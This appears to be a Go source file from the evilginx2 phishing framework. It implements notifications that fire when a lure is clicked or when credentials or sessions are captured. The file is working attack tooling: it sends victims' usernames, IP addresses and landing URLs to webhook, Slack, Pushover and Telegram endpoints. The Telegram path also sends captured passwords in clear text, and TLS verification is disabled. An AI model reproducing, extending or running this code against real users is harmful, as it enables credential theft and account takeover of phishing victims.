package core

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

const (
	EVENT_LURE_CLICKED        = "lure_clicked"
	EVENT_CREDENTIAL_CAPTURED = "credential_captured"
	EVENT_SESSION_CAPTURED    = "session_captured"
)

var VALID_EVENTS = []string{EVENT_LURE_CLICKED, EVENT_CREDENTIAL_CAPTURED, EVENT_SESSION_CAPTURED}

type NotificationEvent struct {
	Type       string            `json:"type"`
	Timestamp  string            `json:"timestamp"`
	ServerName string            `json:"server_name"`
	SessionId  int               `json:"session_id"`
	Phishlet   string            `json:"phishlet"`
	Username   string            `json:"username,omitempty"`
	Password   string            `json:"password,omitempty"`
	RemoteAddr string            `json:"remote_addr,omitempty"`
	UserAgent  string            `json:"user_agent,omitempty"`
	LandingUrl string            `json:"landing_url,omitempty"`
	Custom     map[string]string `json:"custom,omitempty"`
}

type NotificationManager struct {
	cfg    *Config
	client *http.Client
}

func NewNotificationManager(cfg *Config) *NotificationManager {
	return &NotificationManager{
		cfg: cfg,
		client: &http.Client{
			Timeout: 10 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		},
	}
}

// Notify sends notifications for the given event to all matching notifiers
func (nm *NotificationManager) Notify(event *NotificationEvent) {
	event.Timestamp = time.Now().UTC().Format(time.RFC3339)
	event.ServerName = nm.cfg.GetServerName()

	for _, n := range nm.cfg.GetNotifiers() {
		if !n.Enabled {
			continue
		}
		if !nm.hasEventTrigger(n, event.Type) {
			continue
		}

		go func(notifier *NotifierConfig) {
			var err error
			switch notifier.Type {
			case "webhook":
				err = nm.sendWebhook(notifier, event)
			case "slack":
				err = nm.sendSlack(notifier, event)
			case "pushover":
				err = nm.sendPushover(notifier, event)
			case "telegram":
				err = nm.sendTelegram(notifier, event)
			default:
				err = fmt.Errorf("unknown notifier type: %s", notifier.Type)
			}
			if err != nil {
				log.Error("notify [%s]: %v", notifier.Name, err)
			} else {
				log.Debug("notify [%s]: %s notification sent", notifier.Name, event.Type)
			}
		}(n)
	}
}

// TestNotifier sends a test notification
func (nm *NotificationManager) TestNotifier(n *NotifierConfig) error {
	event := &NotificationEvent{
		Type:       "test",
		Timestamp:  time.Now().UTC().Format(time.RFC3339),
		ServerName: nm.cfg.GetServerName(),
		SessionId:  0,
		Phishlet:   "test",
		Username:   "test@example.com",
		RemoteAddr: "127.0.0.1",
	}

	switch n.Type {
	case "webhook":
		return nm.sendWebhook(n, event)
	case "slack":
		return nm.sendSlack(n, event)
	case "pushover":
		return nm.sendPushover(n, event)
	case "telegram":
		return nm.sendTelegram(n, event)
	default:
		return fmt.Errorf("unknown notifier type: %s", n.Type)
	}
}

func (nm *NotificationManager) hasEventTrigger(n *NotifierConfig, eventType string) bool {
	for _, t := range n.Triggers {
		if t == eventType {
			return true
		}
	}
	return false
}

// sendWebhook sends a JSON payload to the configured webhook URL
func (nm *NotificationManager) sendWebhook(n *NotifierConfig, event *NotificationEvent) error {
	webhookUrl, ok := n.Config["url"]
	if !ok || webhookUrl == "" {
		return fmt.Errorf("webhook URL not configured (set with: notify set %s url <url>)", n.Name)
	}

	payload, err := json.Marshal(event)
	if err != nil {
		return fmt.Errorf("failed to marshal event: %v", err)
	}

	req, err := http.NewRequest("POST", webhookUrl, bytes.NewBuffer(payload))
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")

	// Add optional auth header
	if authHeader, ok := n.Config["auth_header"]; ok && authHeader != "" {
		req.Header.Set("Authorization", authHeader)
	}

	resp, err := nm.client.Do(req)
	if err != nil {
		return fmt.Errorf("request failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		body, _ := ioutil.ReadAll(resp.Body)
		return fmt.Errorf("webhook returned %d: %s", resp.StatusCode, string(body))
	}

	return nil
}

// sendSlack sends a formatted message to a Slack webhook
func (nm *NotificationManager) sendSlack(n *NotifierConfig, event *NotificationEvent) error {
	webhookUrl, ok := n.Config["url"]
	if !ok || webhookUrl == "" {
		return fmt.Errorf("slack webhook URL not configured (set with: notify set %s url <url>)", n.Name)
	}

	// Build Slack message
	var emoji string
	var title string
	switch event.Type {
	case EVENT_LURE_CLICKED:
		emoji = ":fishing_pole_and_fish:"
		title = "Lure Clicked"
	case EVENT_CREDENTIAL_CAPTURED:
		emoji = ":key:"
		title = "Credentials Captured"
	case EVENT_SESSION_CAPTURED:
		emoji = ":trophy:"
		title = "Session Captured"
	default:
		emoji = ":bell:"
		title = "Test Notification"
	}

	var fields []string
	fields = append(fields, fmt.Sprintf("*%s %s*", emoji, title))
	if event.ServerName != "" {
		fields = append(fields, fmt.Sprintf("Server: `%s`", event.ServerName))
	}
	fields = append(fields, fmt.Sprintf("Phishlet: `%s`", event.Phishlet))
	fields = append(fields, fmt.Sprintf("Session: `%d`", event.SessionId))
	if event.Username != "" {
		fields = append(fields, fmt.Sprintf("Username: `%s`", event.Username))
	}
	if event.RemoteAddr != "" {
		fields = append(fields, fmt.Sprintf("IP: `%s`", event.RemoteAddr))
	}
	if event.LandingUrl != "" {
		fields = append(fields, fmt.Sprintf("URL: `%s`", event.LandingUrl))
	}

	text := strings.Join(fields, "\n")

	slackPayload := map[string]string{"text": text}
	payload, _ := json.Marshal(slackPayload)

	resp, err := nm.client.Post(webhookUrl, "application/json", bytes.NewBuffer(payload))
	if err != nil {
		return fmt.Errorf("slack request failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		body, _ := ioutil.ReadAll(resp.Body)
		return fmt.Errorf("slack returned %d: %s", resp.StatusCode, string(body))
	}

	return nil
}

// sendPushover sends a notification via the Pushover API
func (nm *NotificationManager) sendPushover(n *NotifierConfig, event *NotificationEvent) error {
	token, ok := n.Config["token"]
	if !ok || token == "" {
		return fmt.Errorf("pushover token not configured (set with: notify set %s token <token>)", n.Name)
	}
	user, ok := n.Config["user"]
	if !ok || user == "" {
		return fmt.Errorf("pushover user key not configured (set with: notify set %s user <user_key>)", n.Name)
	}

	var title string
	switch event.Type {
	case EVENT_LURE_CLICKED:
		title = "Lure Clicked"
	case EVENT_CREDENTIAL_CAPTURED:
		title = "Credentials Captured"
	case EVENT_SESSION_CAPTURED:
		title = "Session Captured"
	default:
		title = "Test Notification"
	}

	var msgParts []string
	msgParts = append(msgParts, fmt.Sprintf("Phishlet: %s", event.Phishlet))
	msgParts = append(msgParts, fmt.Sprintf("Session: %d", event.SessionId))
	if event.Username != "" {
		msgParts = append(msgParts, fmt.Sprintf("Username: %s", event.Username))
	}
	if event.RemoteAddr != "" {
		msgParts = append(msgParts, fmt.Sprintf("IP: %s", event.RemoteAddr))
	}
	message := strings.Join(msgParts, "\n")

	if event.ServerName != "" {
		title = fmt.Sprintf("[%s] %s", event.ServerName, title)
	}

	data := url.Values{
		"token":   {token},
		"user":    {user},
		"title":   {title},
		"message": {message},
	}

	resp, err := nm.client.PostForm("https://api.pushover.net/1/messages.json", data)
	if err != nil {
		return fmt.Errorf("pushover request failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		body, _ := ioutil.ReadAll(resp.Body)
		return fmt.Errorf("pushover returned %d: %s", resp.StatusCode, string(body))
	}

	return nil
}

// sendTelegram sends a notification via the Telegram Bot API.
// Self-contained: only requires a free bot token (create via @BotFather) and a chat ID.
func (nm *NotificationManager) sendTelegram(n *NotifierConfig, event *NotificationEvent) error {
	botToken, ok := n.Config["bot_token"]
	if !ok || botToken == "" {
		return fmt.Errorf("telegram bot_token not configured (set with: notify set %s bot_token <token>)", n.Name)
	}
	chatId, ok := n.Config["chat_id"]
	if !ok || chatId == "" {
		return fmt.Errorf("telegram chat_id not configured (set with: notify set %s chat_id <id>)", n.Name)
	}

	var emoji string
	var title string
	switch event.Type {
	case EVENT_LURE_CLICKED:
		emoji = "\xF0\x9F\x8E\xA3" // fishing pole emoji
		title = "Lure Clicked"
	case EVENT_CREDENTIAL_CAPTURED:
		emoji = "\xF0\x9F\x94\x91" // key emoji
		title = "Credentials Captured"
	case EVENT_SESSION_CAPTURED:
		emoji = "\xF0\x9F\x8F\x86" // trophy emoji
		title = "Session Captured"
	default:
		emoji = "\xF0\x9F\x94\x94" // bell emoji
		title = "Test Notification"
	}

	var lines []string
	lines = append(lines, fmt.Sprintf("%s *%s*", emoji, title))
	if event.ServerName != "" {
		lines = append(lines, fmt.Sprintf("Server: `%s`", event.ServerName))
	}
	lines = append(lines, fmt.Sprintf("Phishlet: `%s`", event.Phishlet))
	lines = append(lines, fmt.Sprintf("Session: `%d`", event.SessionId))
	if event.Username != "" {
		lines = append(lines, fmt.Sprintf("Username: `%s`", event.Username))
	}
	if event.Password != "" {
		lines = append(lines, fmt.Sprintf("Password: `%s`", event.Password))
	}
	if event.RemoteAddr != "" {
		lines = append(lines, fmt.Sprintf("IP: `%s`", event.RemoteAddr))
	}
	if event.LandingUrl != "" {
		lines = append(lines, fmt.Sprintf("URL: `%s`", event.LandingUrl))
	}

	text := strings.Join(lines, "\n")

	apiUrl := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
	payload := map[string]string{
		"chat_id":    chatId,
		"text":       text,
		"parse_mode": "Markdown",
	}
	payloadBytes, _ := json.Marshal(payload)

	resp, err := nm.client.Post(apiUrl, "application/json", bytes.NewBuffer(payloadBytes))
	if err != nil {
		return fmt.Errorf("telegram request failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		body, _ := ioutil.ReadAll(resp.Body)
		return fmt.Errorf("telegram returned %d: %s", resp.StatusCode, string(body))
	}

	return nil
}
